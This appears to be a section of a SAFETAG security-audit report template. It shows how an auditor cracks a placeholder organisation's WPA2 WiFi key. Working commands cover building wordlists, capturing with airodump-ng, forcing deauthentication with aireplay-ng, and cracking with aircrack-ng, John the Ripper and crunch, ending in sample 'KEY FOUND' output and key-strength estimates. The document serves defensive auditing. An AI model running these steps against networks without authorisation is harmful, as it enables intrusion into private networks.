An attacker can crack the SampleOrg office’s WPA key in approximately <time> with a short and minimally customized password dictionary containing approximately <number> entries.

Step 1: The attacker customizes his WiFi password dictionary, adding phrases related to the subject: organization name, street address, phone number, email domain, wireless network name, etc. Common password fragments are included, as well: qwerty, 12345, asdf and all four-digit dates back to the year 2001, for example, among others. He may then add hundreds or thousands of words (in English and/or other relevant languages). He may then “fold” his dictionary, so that it includes an entry for each pair of these strings:

$ for foo in `cat pwdlist.txt`; do for bar in `cat pwdlist.txt`; do printf $foo$bar\n; done; done > pwdpairs.txt
$ cat pwdlist.txt >> pwdpairs.txt

Step 2: The attacker would then begin recording all (encrypted) wireless traffic associated with the organization’s access point:

$ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0

 CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1                                                   
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                         
 1A:2B:3C:4D:5E:6F  -70 100    12345    43210    6   1  12e. WPA2 CCMP   PSK sampleorg                                                         
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                                  
 1A:2B:3C:4D:5E:6F  01:23:45:67:89:01    0    0e- 0e   186    12345
 1A:2B:3C:4D:5E:6F  AB:CD:EF:AB:CD:EF    0    1e- 1      0     1234
 1A:2B:3C:4D:5E:6F  AA:BB:CC:DD:EE:FF  -76    0e- 1      0     1122
 1A:2B:3C:4D:5E:6F  A1:B2:C3:D4:E5:F6  -80    0e- 1      0     4321

Step 3: Next, he would force a wireless client, possibly chosen at random, to disconnect and reconnect (an operation that is nearly always invisible to the user). In the example below, AB:CD:EF:AB:CD:EF is the MAC address of a laptop that was briefly disconnected in this way.

$ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0 

 15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1
 15:54:49  Sending 64 directed DeAuth. STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]

Step 4: The goal of this above step is to capture the cryptographic handshake that occurs when the targeted client reconnects. Try using different clients if the first one doesn't work, or try moving around. 

This handshake does not contain the WPA key itself, but once the the complete handshake process has been seen, the auditor (or a potential attacker) can leave the vicinity and run various password cracking tools to try and discover the password. While a complete password cracking tutorial is out of scope for SAFETAG documentation, below are three strategies:

### Using a pre-compilex wordlist called pwdpairs.txt ###

A good wordlist with a few tweaks tends to break most passwords.  Using a collection of all english words, all words from the language of the organization being audited, plus a combination of all these words, plus relevant keywords, addresses, and years tends to crack most wifi passwords.

$ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap

### Using a combination of brute forcing, wordlists and roles with John the Ripper (JtR) ###

JtR is a powerful tool you can use in combination of existing wordlists, but it also can add in common substitutions (people using zero for the letter "o").  You can add custom "rules" to aid in these substitutions - a base set is included with JtR, but a much more powerful set is added by KoreLogic (http://contest-2010.korelogic.com/rules.html).  KoreLogic also provides a custon character set "chr file" that takes password frequency data from large collections of real-world passwords to speed up JtR's brute force mode (http://www.korelogic.com/tools.html) . This PDF presentation has a good walkthrough of how John and Kore's rules work: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB8QFjAA&url=https%3A%2F%2Fwww.owasp.org%2Fimages%2Fa%2Faf%2F2011-Supercharged-Slides-Redman-OWASP-Feb.pdf

### Brute force, using crunch ###

As a last resort, you can try a direct brute force attack overnight or post-audit to fill in details on key strength.

Crunch is a very simple but thorough approach. Given enough time it will break a password, but it's not particularly fast, even at simple passwords. 

$ /path/to/crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | aircrack-ng -a 2 path/to/capture.pcap -b 00:11:22:33:44:55 -w -

This says to try every possible alpha-numeric combination from 8 to 16 characters. This will take a very long time. WPA passwords are a minimum of 8 characters, and can also contain punctuation. 

You can reduce the scope of this attack (and speed it up) if you have a reason to believe the password is all lower-case, all-numeric, or so on.  Some wifi routers will accept punctuation marks as well, but these are generally less used outside of periods and exclamation marks.


For practice on any of these methods, you can use the wpa-Induction.pcap file from http://wiki.wireshark.org/SampleCaptures .

Successful password cracking via piping these into aircrack-ng:

 Opening sampleorg_airodump-01.cap
 Reading packets, please wait...
                                 Aircrack-ng 1.1
                    [00:00:05] 9123 keys tested (1876.54 k/s)
                           KEY FOUND! [ sample2012 ]

      Master Key     : 2A 7C B1 92 C4 61 A9 F6 7F 98 6B C1 AB 53 7A 0F 
                       3C AF D7 9A 0C BD F0 4B A2 44 EE 5B 13 94 12 12 

      Transient Key  : A9 C8 AD 47 F9 71 2A C6 55 F8 F0 73 FB 9A E6 1D 
                       23 D9 31 25 5D B1 CF EA 99 2C B3 D7 E5 7F 91 2D 
                       56 25 D5 9A 1F AD C5 02 E3 2C C9 ED 74 55 BA 94 
                       D6 F5 0A D1 3B FB 39 40 19 C9 BA 65 2E 49 3D 14 

      EAPOL HMAC     : F1 DF 09 C4 5A 96 0B AD 83 DD F9 07 4E FA 19 74 

The fourth line of the above output provides some useful information about the effectiveness of a strong WPA key. That rate of approximately 2000 keys per second means that a full-on, brute-force attack against a similar-length key that was truly random (and therefore immune to dictionary-based attacks) would take about 70^9 or 20 trillion seconds, which is well over 600,000 years. Or, for those who favor length and simplicity over brevity and complexity, a key containing four words chosen from among the 10,000 most common English dictionary words would still take approximately 150,000 years to crack (using this method on an average laptop).

It is worth noting that an attacker with the resources and the expertise could increase this rate by a factor of a hundred. Using a computer with powerful graphical processing units (GPUs) or a cloud computing service like Amazon’s EC2, it is possible to test 250,000 or more keys per second. A setup like this would still take several lifetimes to guess a strong password, however.

Regardless, the success of this attack against SampleOrg’s wireless network would allow an attacker to bypass all perimeter controls, including the network firewall. Without access to the office LAN, a non-ISP, non-government attacker would have to position himself on the same network as an external staff member in order to exploit any flaws in the organization’s email or file-sharing services. With access to the local network, however, that attacker could begin carrying out Local attacks quite quickly, and from a distance.

With regard to the distance from which an attacker could maintain such access, SampleOrg’s office WiFi network appears to have a relatively strong signal, which extends to the street out front:

<photograph of location>   

<screenshot of WiFi strength>

Figure 1: WiFi signal strength from a nearby location